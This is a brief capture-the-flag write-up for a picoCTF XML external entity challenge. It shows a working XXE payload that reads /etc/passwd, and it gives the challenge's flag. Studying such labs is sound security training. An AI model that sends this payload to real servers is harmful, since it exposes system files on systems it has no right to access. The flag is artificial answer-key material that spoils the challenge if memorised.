#xxe #XXE 
##### Challenge Description

The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?[Web Portal](http://saturn.picoctf.net:61991/)


#### Understanding 






![](../../PicoCTF-assets/Pasted%20image%2020260308233622.png)


According to the challenge description I need to find the flag in /etc/passwd :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data><ID>&xxe;</ID></data>
```


![](../../PicoCTF-assets/Pasted%20image%2020260308235239.png)

Flag : picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}